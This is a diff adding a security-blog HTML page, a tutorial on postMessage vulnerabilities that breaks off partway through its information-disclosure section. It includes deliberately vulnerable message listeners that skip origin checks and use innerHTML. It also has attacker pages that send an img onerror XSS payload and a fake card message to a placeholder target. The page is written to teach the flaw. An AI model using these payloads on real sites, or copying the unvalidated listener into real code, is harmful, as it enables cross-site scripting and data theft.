@@ -1,0 +1,894 @@
+  <!-- ============================================================
+       Everything below this comment is a template I designed for the homepage, the HTML/CSS/JS is all by AI.
+       You can use it as needed to add your own content, projects, articles, and writeups.
+       I added comments throughout to guide you on how to edit and customize each section.
+       Have fun :)
+  ============================================================ -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>symibot — postMessage Vulnerabilities</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet" />
+
+  <style>
+    /* ============================================================
+       CSS VARIABLES — Same as index.html, keep these in sync
+    ============================================================ */
+    :root {
+      --bg:         #0d0d0d;
+      --bg-card:    #141414;
+      --bg-card2:   #1a1a1a;
+      --border:     #2a2a2a;
+      --red:        #e8272a;
+      --red-dim:    rgba(232,39,42,0.12);
+      --text:       #e8e8e8;
+      --text-muted: #888;
+      --text-dim:   #555;
+      --font-mono:  'JetBrains Mono', monospace;
+      --font-sans:  'Syne', sans-serif;
+      --radius:     8px;
+      --transition: 0.2s ease;
+    }
+
+    /* ============================================================
+       GLOBAL RESET & BASE
+    ============================================================ */
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-sans);
+      font-size: 16px;
+      line-height: 1.7;
+      overflow-x: hidden;
+    }
+
+    a { color: inherit; text-decoration: none; }
+
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 3px; }
+
+    /* ============================================================
+       NAVIGATION — Identical to index.html
+    ============================================================ */
+    header {
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      background: rgba(13,13,13,0.92);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid var(--border);
+    }
+
+    .nav-inner {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      height: 60px;
+    }
+
+    .logo {
+      font-family: var(--font-mono);
+      font-size: 1.1rem;
+      font-weight: 700;
+    }
+    .logo span { color: var(--red); }
+
+    nav { display: flex; align-items: center; gap: 32px; }
+
+    nav a {
+      font-size: 0.8rem;
+      font-weight: 600;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--text-muted);
+      transition: color var(--transition);
+    }
+    nav a:hover { color: var(--text); }
+
+    .nav-icons { display: flex; gap: 16px; align-items: center; }
+    .nav-icons a { color: var(--text-muted); transition: color var(--transition); }
+    .nav-icons a:hover { color: var(--red); }
+    .nav-icons svg { width: 20px; height: 20px; fill: currentColor; }
+
+    .hamburger { display: none; flex-direction: column; gap: 5px; cursor: pointer; padding: 4px; }
+    .hamburger span { display: block; width: 22px; height: 2px; background: var(--text); }
+
+
+    /* ============================================================
+       ARTICLE LAYOUT
+       The page is split into:
+         - .article-main  : the article text (left/center, wide)
+         - .article-aside : sticky table of contents (right)
+    ============================================================ */
+    .article-layout {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 0 24px;
+      display: grid;
+      grid-template-columns: 1fr 260px;
+      gap: 60px;
+      align-items: start;
+    }
+
+    /* ============================================================
+       ██████████  ARTICLE HEADER  ██████████
+    ============================================================ */
+    .article-header {
+      padding: 56px 0 40px;
+      border-bottom: 1px solid var(--border);
+      margin-bottom: 48px;
+      grid-column: 1 / -1;
+    }
+
+    .article-category {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: var(--red);
+      border: 1px solid rgba(232,39,42,0.3);
+      background: var(--red-dim);
+      padding: 4px 12px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+    }
+    .article-category::before {
+      content: '';
+      width: 6px; height: 6px;
+      background: var(--red);
+      border-radius: 50%;
+    }
+
+    .article-title {
+      font-size: clamp(1.8rem, 4vw, 2.8rem);
+      font-weight: 800;
+      line-height: 1.2;
+      margin-bottom: 20px;
+      max-width: 760px;
+    }
+
+    .article-subtitle {
+      font-size: 1.05rem;
+      color: var(--text-muted);
+      max-width: 680px;
+      margin-bottom: 28px;
+      line-height: 1.7;
+    }
+
+    .article-meta {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      flex-wrap: wrap;
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: var(--text-dim);
+    }
+    .article-meta .sep { color: var(--border); }
+    .article-meta .tag {
+      background: var(--bg-card2);
+      border: 1px solid var(--border);
+      padding: 2px 10px;
+      border-radius: 4px;
+      color: var(--text-muted);
+    }
+
+    /* ============================================================
+       TABLE OF CONTENTS (right sidebar)
+    ============================================================ */
+    .article-aside {
+      position: sticky;
+      top: 80px;
+      padding-top: 4px;
+    }
+
+    .toc-box {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 20px;
+    }
+
+    .toc-label {
+      font-family: var(--font-mono);
+      font-size: 0.68rem;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: var(--text-dim);
+      margin-bottom: 14px;
+    }
+
+    .toc-list { list-style: none; }
+    .toc-list li { margin: 0; }
+    .toc-list a {
+      display: block;
+      font-size: 0.78rem;
+      color: var(--text-muted);
+      padding: 5px 0 5px 12px;
+      border-left: 2px solid var(--border);
+      line-height: 1.4;
+      transition: color var(--transition), border-color var(--transition);
+    }
+    .toc-list a:hover,
+    .toc-list a.active {
+      color: var(--text);
+      border-left-color: var(--red);
+    }
+    .toc-list .toc-h3 a {
+      padding-left: 24px;
+      font-size: 0.73rem;
+    }
+
+    /* ============================================================
+       ARTICLE BODY STYLES
+    ============================================================ */
+    .article-main { min-width: 0; }
+    .article-body { padding-bottom: 80px; }
+
+    .article-body p {
+      color: var(--text-muted);
+      margin-bottom: 20px;
+      font-size: 0.97rem;
+      line-height: 1.85;
+    }
+
+    .article-body h2 {
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: var(--text);
+      margin: 52px 0 16px;
+      padding-bottom: 10px;
+      border-bottom: 1px solid var(--border);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .article-body h2::before {
+      content: '';
+      display: inline-block;
+      width: 4px;
+      height: 1.2em;
+      background: var(--red);
+      border-radius: 2px;
+      flex-shrink: 0;
+    }
+
+    .article-body h3 {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--text);
+      margin: 36px 0 12px;
+    }
+
+    .article-body code {
+      font-family: var(--font-mono);
+      font-size: 0.82em;
+      background: var(--bg-card2);
+      border: 1px solid var(--border);
+      color: var(--red);
+      padding: 2px 7px;
+      border-radius: 4px;
+      white-space: nowrap;
+    }
+
+    .article-body pre {
+      background: #111;
+      border: 1px solid #222;
+      border-radius: var(--radius);
+      overflow-x: auto;
+      margin: 24px 0;
+      position: relative;
+    }
+
+    .article-body pre code {
+      display: block;
+      padding: 20px 24px;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      line-height: 1.8;
+      color: #ccc;
+      background: transparent;
+      border: none;
+      white-space: pre;
+    }
+
+    .article-body .c-red  { color: var(--red); }
+    .article-body .c-grn  { color: #5a9e6f; }
+    .article-body .c-yel  { color: #c9a227; }
+    .article-body .c-dim  { color: #555; }
+    .article-body .c-blu  { color: #6ab0f5; }
+
+    .copy-btn {
+      position: absolute;
+      top: 8px;
+      right: 14px;
+      background: var(--bg-card2);
+      border: 1px solid var(--border);
+      border-radius: 4px;
+      color: var(--text-dim);
+      font-family: var(--font-mono);
+      font-size: 0.65rem;
+      padding: 3px 9px;
+      cursor: pointer;
+      transition: color var(--transition), border-color var(--transition);
+    }
+    .copy-btn:hover { color: var(--text); border-color: var(--text-muted); }
+    .copy-btn.copied { color: #5a9e6f; border-color: #5a9e6f; }
+
+    .article-body .callout {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--red);
+      border-radius: var(--radius);
+      padding: 16px 20px;
+      margin: 24px 0;
+      font-size: 0.9rem;
+      color: var(--text-muted);
+    }
+    .article-body .callout-warn { border-left-color: #c9a227; }
+    .article-body .callout-tip  { border-left-color: #5a9e6f; }
+    .article-body .callout strong { color: var(--text); }
+
+    .article-body ul, .article-body ol {
+      margin: 16px 0 24px 0;
+      padding-left: 0;
+      list-style: none;
+    }
+    .article-body ul li, .article-body ol li {
+      font-size: 0.95rem;
+      color: var(--text-muted);
+      padding: 5px 0 5px 20px;
+      position: relative;
+      line-height: 1.7;
+    }
+    .article-body ul li::before {
+      content: '';
+      position: absolute;
+      left: 0;
+      top: 14px;
+      width: 6px; height: 6px;
+      background: var(--red);
+      border-radius: 50%;
+    }
+    .article-body ol { counter-reset: ol-counter; }
+    .article-body ol li { counter-increment: ol-counter; }
+    .article-body ol li::before {
+      content: counter(ol-counter) '.';
+      position: absolute;
+      left: 0;
+      color: var(--red);
+      font-family: var(--font-mono);
+      font-size: 0.8rem;
+      font-weight: 700;
+    }
+    .article-body ul ul, .article-body ol ul {
+      margin: 4px 0 4px 16px;
+    }
+    .article-body ul ul li::before { background: #444; }
+
+    .article-body .diagram {
+      background: var(--bg-card);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 24px;
+      margin: 28px 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      overflow: hidden;
+    }
+    .article-body .diagram img {
+      max-width: 100%;
+      border-radius: 4px;
+    }
+    .article-body .diagram-caption {
+      text-align: center;
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      color: var(--text-dim);
+      margin-top: -16px;
+      margin-bottom: 28px;
+    }
+
+    .article-body hr {
+      border: none;
+      border-top: 1px solid var(--border);
+      margin: 48px 0;
+    }
+
+    .article-nav {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+      padding: 32px 0;
+      border-top: 1px solid var(--border);
+      margin-top: 0;
+      flex-wrap: wrap;
+    }
+    .article-nav a {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.85rem;
+      font-weight: 700;
+      color: var(--text-muted);
+      transition: color var(--transition);
+    }
+    .article-nav a:hover { color: var(--text); }
+    .back-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.8rem;
+      font-weight: 700;
+      color: var(--text-muted);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 7px 16px;
+      transition: color var(--transition), border-color var(--transition);
+    }
+    .back-btn:hover { color: var(--text); border-color: var(--text-muted); }
+
+    footer {
+      border-top: 1px solid var(--border);
+      padding: 40px 0;
+      text-align: center;
+    }
+    .footer-heading {
+      font-size: 0.8rem;
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      color: var(--text-dim);
+      margin-bottom: 24px;
+    }
+    .footer-links {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 36px;
+      flex-wrap: wrap;
+    }
+    .footer-link {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-weight: 700;
+      font-size: 0.9rem;
+      transition: color var(--transition);
+    }
+    .footer-link.twitter { color: var(--red); }
+    .footer-link.email   { color: var(--text-muted); }
+    .footer-link:hover   { opacity: 0.75; }
+
+    @media (max-width: 900px) {
+      .article-layout { grid-template-columns: 1fr; gap: 0; }
+      .article-aside { display: none; }
+    }
+    @media (max-width: 768px) {
+      nav { display: none; }
+      nav.open {
+        display: flex;
+        flex-direction: column;
+        position: fixed;
+        inset: 60px 0 0 0;
+        background: var(--bg);
+        padding: 24px;
+        gap: 20px;
+        z-index: 99;
+      }
+      .hamburger { display: flex; }
+      .article-header { padding: 40px 0 32px; }
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <div class="nav-inner">
+  <a href="#" class="logo">symibot <span>/&gt;</span></a>
+  <nav id="main-nav">
+
+  </nav>
+  <div class="nav-icons">
+    <a href="https://github.com/symibot" target="_blank" aria-label="GitHub">
+      <svg viewBox="0 0 24 24"><path d="M12 .5C5.37.5 0 5.87 0 12.5c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0 0 24 12.5C24 5.87 18.63.5 12 .5Z"/></svg>
+    </a>
+    <a href="https://x.com/symibot" target="_blank" aria-label="X (Twitter)">
+      <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+    </a>
+    <a href="mailto:symibot@gmail.com" aria-label="Email">
+      <svg viewBox="0 0 24 24"><path d="M20 4H4C2.9 4 2 4.9 2 6v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4-8 5-8-5V6l8 5 8-5v2z"/></svg>
+    </a>
+    <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
+  </div>
+</div>
+</header>
+</header>
+
+<div class="article-layout">
+  <div class="article-header">
+    <div class="article-category">Client-Side Security</div>
+    <h1 class="article-title">postMessage Vulnerabilities</h1>
+    <p class="article-subtitle">A deep dive into cross-origin communication risks — how improper use of postMessage can lead to XSS, data leaks, and full account compromise.</p>
+    <div class="article-meta">
+      <span>May 18, 2025</span>
+      <span class="sep">·</span>
+      <span>14 min read</span>
+      <span class="sep">·</span>
+
+    </div>
+  </div>
+
+  <main class="article-main">
+    <article class="article-body">
+      <h2 id="introduction">Introduction</h2>
+      <p>Before you learn about postMessage, you need to know what SOP is. Here is a brief definition:</p>
+      <p><strong>The Same-Origin Policy (SOP):</strong><br>A security rule that prevents scripts from one website (origin) from accessing data from another website (another origin). It protects user sessions and sensitive data from malicious websites.</p>
+      <p>So, SOP basically prevents Cross-Origin Communication. However, Modern web applications often need to communicate between different domains (e.g., Google services like Gmail and YouTube). This is made possible by features like CORS, which is used to control access to resources (like APIs) from different domains and is primarily about controlling how browsers handle HTTP requests. postMessage is similar, it's used to communicate safely between different windows or frames across different origins, without the need for an HTTP request.</p>
+
+      <h2 id="postmessage">postMessage</h2>
+      <p>A built-in JavaScript API that basically lets different pages or windows, or iFrames send messages to each other even if they're from different origins. The simplest way to think of them is a pathway for two browser frames to communicate. "What is a frame?" You might ask? A frame is a:</p>
+      <ul><li>Browser tab</li><li><code>&lt;iframe&gt;</code> frame</li><li><code>&lt;portal&gt;</code> frame (not yet fully released)</li></ul>
+      <p>You can read more about it in detail <a href="#">here</a>.</p>
+      <p><code>postMessage()</code> has built-in safety features:</p>
+      <p>When sending a message, you can specify the target origin (the website you want to send the message to):</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-yel">targetWindowName</span>.<span class="c-blu">postMessage</span>(<span class="c-grn">"Hello, world!"</span>, <span class="c-grn">"https://trusted-site.com"</span>);</code></pre>
+      <p>When receiving messages, you can check the origin of the message to make sure it came from a trusted source. The receiving window listens for the message using an event listener:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-blu">window</span>.<span class="c-blu">addEventListener</span>(<span class="c-grn">'message'</span>, <span class="c-yel">function</span>(<span class="c-blu">event</span>) {
+    <span class="c-yel">if</span> (<span class="c-blu">event</span>.<span class="c-blu">origin</span> === <span class="c-grn">'https://trusted-site.com'</span>) {
+        <span class="c-blu">console</span>.<span class="c-blu">log</span>(<span class="c-grn">'Safe message:'</span>, <span class="c-blu">event</span>.<span class="c-blu">data</span>);
+    } <span class="c-yel">else</span> {
+        <span class="c-blu">console</span>.<span class="c-blu">log</span>(<span class="c-grn">'Blocked message from:'</span>, <span class="c-blu">event</span>.<span class="c-blu">origin</span>);
+    }
+});</code></pre>
+      <p>Let's understand more with a real example:</p>
+
+      <h3 id="example-1-page-talking-to-popup">example 1: A Page Talking to a Popup It Opened</h3>
+      <p>Imagine you're on a website, and you click "Login with Google". A popup window opens where you log in. Once you're logged in, the popup needs to tell the original page that you're logged in.</p>
+      <p><strong>Without postMessage():</strong><br>The main page and the popup can't communicate because they are from different websites (your site and Google's site).</p>
+      <p><strong>With postMessage():</strong><br>The popup can send a message back to the main page to say, "Hey, the user logged in successfully!"</p>
+
+      <h3 id="example-2-page-talking-to-iframe">example 2: A Page Talking to an Iframe</h3>
+      <p>Let's say you embed a YouTube video on your blog using an iframe. The YouTube player might need to send messages to your blog, like telling it when the video starts playing or when it's paused.</p>
+      <p><strong>Without postMessage():</strong><br>Your page and the YouTube iframe can't share data because they come from different origins.</p>
+      <p><strong>With postMessage():</strong><br>The YouTube iframe can send messages to your blog page, like "The video has started playing."</p>
+
+      <h2 id="problems">Problems</h2>
+      <p>Can you understand why this could cause a problem? If postMessage is not used properly, like not validating the message's origin when receiving data, it can lead to security risks like DOM-based XSS or Information Disclosure.</p>
+
+      <h3 id="dom-based-xss-via-postmessage">DOM-based XSS via postMessage</h3>
+      <p>Let's say the target site (https://vulnerable-site.com/) has the following code:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-dim">&lt;html&gt;</span>
+<span class="c-dim">&lt;head&gt;</span>
+    <span class="c-dim">&lt;title&gt;</span>Vulnerable Site<span class="c-dim">&lt;/title&gt;</span>
+<span class="c-dim">&lt;/head&gt;</span>
+<span class="c-dim">&lt;body&gt;</span>
+    <span class="c-dim">&lt;h1&gt;</span>Welcome to Vulnerable Site<span class="c-dim">&lt;/h1&gt;</span>
+    <span class="c-dim">&lt;div id="content"&gt;&lt;/div&gt;</span>
+
+    <span class="c-dim">&lt;script&gt;</span>
+        <span class="c-dim">// Listen for messages from any origin</span>
+        <span class="c-blu">window</span>.<span class="c-blu">addEventListener</span>(<span class="c-grn">"message"</span>, <span class="c-yel">function</span>(<span class="c-blu">event</span>) {
+            <span class="c-dim">// No origin validation</span>
+            <span class="c-blu">document</span>.<span class="c-blu">getElementById</span>(<span class="c-grn">"content"</span>).<span class="c-blu">innerHTML</span> = <span class="c-blu">event</span>.<span class="c-blu">data</span>; <span class="c-dim">// Dangerous: Inserts raw HTML</span>
+        });
+    <span class="c-dim">&lt;/script&gt;</span>
+<span class="c-dim">&lt;/body&gt;</span>
+<span class="c-dim">&lt;/html&gt;</span></code></pre>
+
+      <h4 id="whats-wrong-here">What's Wrong Here?</h4>
+      <p>The site listens for messages using postMessage but:</p>
+      <ul><li>It doesn't validate the origin of the message (event.origin).</li><li>It directly inserts the message data into the DOM using innerHTML, which is unsafe.</li></ul>
+
+      <h4 id="how-the-attacker-discovers">How the Attacker Discovers the Vulnerability (Example scenario)</h4>
+      <p><strong>Step 1: Reconnaissance</strong><br>The attacker visits https://vulnerable-site.com/ and inspects the JavaScript code using the browser's Developer Tools (F12). The attacker then searches for postMessage or addEventListener("message") in the Sources tab (Global listeners -> message -> js code). There are tools to help detect postMessage events.</p>
+      <p><strong>Step 2: Identifying the Flaw</strong><br>The attacker finds the following code:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-blu">window</span>.<span class="c-blu">addEventListener</span>(<span class="c-grn">"message"</span>, <span class="c-yel">function</span>(<span class="c-blu">event</span>) {
+    <span class="c-blu">document</span>.<span class="c-blu">getElementById</span>(<span class="c-grn">"content"</span>).<span class="c-blu">innerHTML</span> = <span class="c-blu">event</span>.<span class="c-blu">data</span>; <span class="c-dim">// Dangerous!</span>
+});</code></pre>
+      <p>The attacker notices:</p>
+      <ul><li>No origin validation (event.origin is not checked, nothing checks where the message came from).</li><li>The message data is inserted directly into the DOM using innerHTML. He can use developer tools to debug and test the EventListener. The attacker could try pasting this in his console:</li></ul>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-blu">window</span>.<span class="c-blu">dispatchEvent</span>(<span class="c-yel">new</span> <span class="c-blu">MessageEvent</span>(<span class="c-grn">"message"</span>, {
+  <span class="c-blu">origin</span>: <span class="c-grn">"https://www.google.com"</span>,
+  <span class="c-blu">data</span>: <span class="c-grn">"alert(document.domain)"</span>
+}));</code></pre>
+      <p>This will send a message to the event listener containing the origin & malicious data, which will get inserted into the DOM because of the dangerous use of the innerHTML element in the code. Of course, the testing works perfectly and smoothly for the attacker in this scenario.</p>
+
+      <p><strong>Step 3: How the Attacker Sets Up the Attack</strong><br>The attacker creates a simple test page (Let's call it https://hacker.com/) to send a message to the target site:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-dim">&lt;script&gt;</span>
+    <span class="c-yel">var</span> targetWindow = <span class="c-blu">window</span>.<span class="c-blu">open</span>(<span class="c-grn">"https://vulnerable-site.com"</span>); <span class="c-dim">// this opens a popup window of vulnerable-site.com</span>
+    <span class="c-blu">setTimeout</span>(<span class="c-yel">function</span>() {
+        targetWindow.<span class="c-blu">postMessage</span>(<span class="c-grn">"&lt;h1&gt;test Message&lt;/h1&gt;"</span>, <span class="c-grn">"*"</span>);
+    }, <span class="c-red">2000</span>);
+<span class="c-dim">&lt;/script&gt;</span></code></pre>
+      <p>If the target site displays the message (&lt;h1&gt;test Message&lt;/h1&gt;), the attacker confirms that the site is vulnerable.<br>Now, the attacker creates a malicious payload to inject a script into the target site.</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-dim">&lt;img src="x" onerror="alert('XSS Attack!')"&gt;</span></code></pre>
+      <p>This payload uses an &lt;img&gt; tag with a broken src attribute (x), which triggers the onerror event handler. The onerror handler executes the malicious script (alert('XSS Attack!')).</p>
+      <p>This is how the hacker's site (https://hacker.com/) would look like:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-dim">&lt;html&gt;</span>
+<span class="c-dim">&lt;head&gt;</span>
+    <span class="c-dim">&lt;title&gt;</span>Exploit<span class="c-dim">&lt;/title&gt;</span>
+<span class="c-dim">&lt;/head&gt;</span>
+<span class="c-dim">&lt;body&gt;</span>
+    <span class="c-dim">&lt;h1&gt;</span>Click the Button to Exploit<span class="c-dim">&lt;/h1&gt;</span>
+    <span class="c-dim">&lt;button onclick="exploit()"&gt;</span>Exploit<span class="c-dim">&lt;/button&gt;</span>    
+    <span class="c-dim">&lt;script&gt;</span>
+        <span class="c-yel">function</span> <span class="c-blu">exploit</span>() {
+            <span class="c-dim">// Open the target site in a new window</span>
+            <span class="c-yel">var</span> targetWindow = <span class="c-blu">window</span>.<span class="c-blu">open</span>(<span class="c-grn">"https://vulnerable-site.com"</span>);
+            <span class="c-dim">// Wait for the page to load</span>
+            <span class="c-blu">setTimeout</span>(<span class="c-yel">function</span>() {
+                <span class="c-dim">// Send the malicious payload</span>
+                targetWindow.<span class="c-blu">postMessage</span>(
+                    <span class="c-grn">'&lt;img src="x" onerror="alert(\'XSS Attack!\')"&gt;'</span>,
+                    <span class="c-grn">"*"</span>
+                );
+            }, <span class="c-red">2000</span>);
+        }
+    <span class="c-dim">&lt;/script&gt;</span>
+<span class="c-dim">&lt;/body&gt;</span>
+<span class="c-dim">&lt;/html&gt;</span></code></pre>
+
+      <h4 id="summary-dom-xss">Summary on how the Dom-based XSS Attack Executes</h4>
+      <p><strong>Step 1: The Victim Visits the Malicious Site</strong><br>The victim visits the attacker's malicious site (exploit.html).<br>The site displays a button labeled "Exploit".</p>
+      <p><strong>Step 2: The Victim Clicks the Button</strong><br>When the victim clicks the button, the exploit() function is triggered:<br>The target site (https://vulnerable-site.com/) is opened in a new window.<br>After 2 seconds, the malicious payload is sent to the target site using postMessage.</p>
+      <p><strong>Step 3: The Target Site Processes the Message</strong><br>The target site receives the message and processes it:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-blu">window</span>.<span class="c-blu">addEventListener</span>(<span class="c-grn">"message"</span>, <span class="c-yel">function</span>(<span class="c-blu">event</span>) {
+    <span class="c-blu">document</span>.<span class="c-blu">getElementById</span>(<span class="c-grn">"content"</span>).<span class="c-blu">innerHTML</span> = <span class="c-blu">event</span>.<span class="c-blu">data</span>; <span class="c-dim">// Inserts the malicious payload</span>
+});</code></pre>
+      <p>The malicious payload (&lt;img src="x" onerror="alert('XSS Attack!')"&gt;) is inserted into the DOM.</p>
+      <p><strong>Step 4: The Malicious Script Executes</strong><br>The &lt;img&gt; tag is added to the DOM, but the src attribute is invalid (x), so the onerror event handler is triggered.</p>
+      <p>The onerror handler executes the malicious script:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-blu">alert</span>(<span class="c-grn">'XSS Attack!'</span>);</code></pre>
+      <p>The impact of an XSS as you know depends on the target.</p>
+
+      <h3 id="information-disclosure-via-postmessage">Information Disclosure via postMessage</h3>
+      <p>While XSS is about executing code, Information Disclosure is about leaking data. Both can happen if postMessage is used incorrectly, but they are distinct issues. This happens when sensitive data (e.g., session tokens, payment details) is exposed to unauthorized parties because the origin of the message is not validated or the data is sent to a wildcard origin ("*")</p>
+
+      <h4 id="example-info-disclosure">Example: Information Disclosure via postMessage</h4>
+      <p>Let's say the target site (https://vulnerable-site.com/) has the following code:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-dim">&lt;html&gt;</span>
+<span class="c-dim">&lt;head&gt;</span>
+    <span class="c-dim">&lt;title&gt;</span>Vulnerable Site<span class="c-dim">&lt;/title&gt;</span>
+<span class="c-dim">&lt;/head&gt;</span>
+<span class="c-dim">&lt;body&gt;</span>
+    <span class="c-dim">&lt;h1&gt;</span>Welcome to Vulnerable Site<span class="c-dim">&lt;/h1&gt;</span>
+    <span class="c-dim">&lt;iframe id="paymentFrame" src="https://payment-provider.com"&gt;&lt;/iframe&gt;</span>
+
+    <span class="c-dim">&lt;script&gt;</span>
+        <span class="c-dim">// Listen for messages from the payment iframe</span>
+        <span class="c-blu">window</span>.<span class="c-blu">addEventListener</span>(<span class="c-grn">"message"</span>, <span class="c-yel">function</span>(<span class="c-blu">event</span>) {
+            <span class="c-dim">// No origin validation</span>
+            <span class="c-blu">console</span>.<span class="c-blu">log</span>(<span class="c-grn">"Payment data received:"</span>, <span class="c-blu">event</span>.<span class="c-blu">data</span>); <span class="c-dim">// Logs sensitive payment data</span>
+        });
+    <span class="c-dim">&lt;/script&gt;</span>
+<span class="c-dim">&lt;/body&gt;</span>
+<span class="c-dim">&lt;/html&gt;</span></code></pre>
+
+      <h4 id="whats-wrong-here-info">What's wrong here?</h4>
+      <ul><li>It doesn't validate the origin of the message (event.origin)</li><li>It logs sensitive payment data (e.g., credit card details, transaction IDs) to the console.</li><li>If the payment iframe sends sensitive data to a wildcard origin, an attacker can intercept it.</li></ul>
+
+      <h4 id="how-attacker-discovers-info">How the Attacker Discovers the Vulnerability</h4>
+      <p><strong>Step 1: Reconnaissance</strong><br>The attacker visits https://vulnerable-site.com and inspects the JavaScript code using the browser's Developer Tools (F12).<br>The attacker searches for postMessage or addEventListener("message") in the Sources tab.</p>
+      <p><strong>Step 2: Identifying the Flaw</strong><br>The attacker finds the following code:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-blu">window</span>.<span class="c-blu">addEventListener</span>(<span class="c-grn">"message"</span>, <span class="c-yel">function</span>(<span class="c-blu">event</span>) {
+    <span class="c-blu">console</span>.<span class="c-blu">log</span>(<span class="c-grn">"Payment data received:"</span>, <span class="c-blu">event</span>.<span class="c-blu">data</span>); <span class="c-dim">// Logs sensitive data</span>
+});</code></pre>
+      <p>The attacker notices:</p>
+      <ul><li>No origin validation (event.origin is not checked).</li><li>Sensitive data is being logged or processed without proper security checks.</li></ul>
+
+      <p><strong>Step 3: Confirming the Vulnerability</strong><br>The attacker creates a simple test page (let's call it https://hacker.com) to send a message to the target site:</p>
+      <pre><button class="copy-btn">Copy</button><code><span class="c-dim">&lt;script&gt;</span>
+    <span class="c-yel">var</span> targetWindow = <span class="c-blu">window</span>.<span class="c-blu">open</span>(<span class="c-grn">"https://vulnerable-site.com"</span>); <span class="c-dim">// Opens a popup window of vulnerable-site.com</span>
+    <span class="c-blu">setTimeout</span>(<span class="c-yel">function</span>() {
+        <span class="c-dim">// Send a fake payment message</span>
+        targetWindow.<span class="c-blu">postMessage</span>(
+            { cardNumber: <span class="c-grn">"1234-5678-9012-3456"</span> },
+            <span class="c-grn">"*"</span> <span class="c-dim">// Wildcard origin (vulnerable)</span>
+        );
+    }, <span class="c-red">2000</span>);
+<span class="c-dim">&lt;/script&gt;</span></code></pre>
+      <p>If the target site logs the payment data ({ cardNumber: "1234-5678-9012-3456" }), the attacker confirms that the site is vulnerable.</p>
+
+      <h4 id="how-attack-executes-info">How the Attack Executes</h4>
+      <p><strong>Step 1:</strong><br>The victim visits the attacker's malicious site (https://hacker.com).<br>The site displays a button labeled "Exploit".</p>
+      <p><strong>Step 2:</strong><br>When the victim clicks the button, the exploit() function is triggered:<br>The target site (https://vulnerable-site.com) is opened in a new window.<br>After 2 seconds, the attacker sends a fake payment message to the target site using postMessage.</p>
